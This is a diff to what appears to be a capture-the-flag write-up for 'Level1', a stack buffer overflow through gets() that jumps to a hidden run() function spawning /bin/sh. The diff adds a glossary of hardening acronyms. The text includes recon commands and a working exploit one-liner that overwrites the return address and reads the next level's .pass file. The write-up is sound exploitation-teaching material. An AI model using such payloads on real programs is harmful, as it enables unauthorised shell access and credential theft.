@@ -1,5 +1,5 @@
 ## Level1 - Buffer Overflow to Hidden run() Function
-Hidden run() at 0x08048444 calls system("/bin/sh"). Exploit overwrites return address via buffer overflow in gets().
+Stack buffer overflow via gets() — overwrite return address to jump to hidden run() at 0x08048444 which calls system("/bin/sh")
 
 ### Settings
 GCC stack protector support:            Enabled
@@ -41,6 +41,14 @@ gets() overflows buffer, overwrites return address. main() returns to run() inst
 objdump -d ./level1 | grep "<run>:" # Find run() function
 strings ./level1 | grep "/bin/sh"  # Find /bin/sh string
 ```
+
+### Acronyms
+ELF    Executable and Linkable Format      The standard binary format for executables, object files, and shared libraries on Linux/Unix systems
+SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
+NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable, preventing shellcode from running directly in those regions
+ASLR   Address Space Layout Randomization  A kernel security feature that randomizes the base addresses of stack, heap, and libraries on each run to make addresses unpredictable
+RELRO  RELocation Read-Only                A hardening technique that marks the GOT read-only after startup, preventing GOT overwrites
+PIE    Position Independent Executable     A binary compiled to load at a random base address, making it compatible with ASLR for full address randomization
 
 ### Execution
 (python -c "print 'A'*76 + '\x44\x84\x04\x08'"; echo "cat /home/user/level2/.pass"; sleep 1) | ./level1
